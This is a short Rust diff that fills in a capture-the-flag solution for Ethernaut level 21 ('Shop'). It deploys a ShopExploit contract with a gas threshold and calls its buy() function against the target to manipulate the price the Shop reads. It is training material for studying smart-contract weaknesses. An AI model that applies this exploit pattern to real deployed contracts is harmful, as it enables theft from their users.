@@ -11,6 +11,12 @@ use ctf::ethereum::ethernaut::lvl21_shop::*;
 
 pub struct Exploit;
 
+alloy::sol!(
+    #[sol(rpc)]
+    ShopExploit,
+    "out/ShopExploit.sol/ShopExploit.json"
+);
+
 #[async_trait]
 impl ctf::Exploit for Exploit {
     type Target = Target;
@@ -20,8 +26,18 @@ impl ctf::Exploit for Exploit {
         target: &Self::Target,
         offender: &Actor,
     ) -> eyre::Result<()> {
-        // TODO: exploit the level
-        let _ = (target, offender);
+        let threshold = 0xf914;
+        let exploit =
+            ShopExploit::deploy(offender.provider(), threshold).await?;
+
+        exploit
+            .buy(target.address)
+            .gas(1_000_000)
+            .send()
+            .await?
+            .watch()
+            .await?;
+
         Ok(())
     }
 }
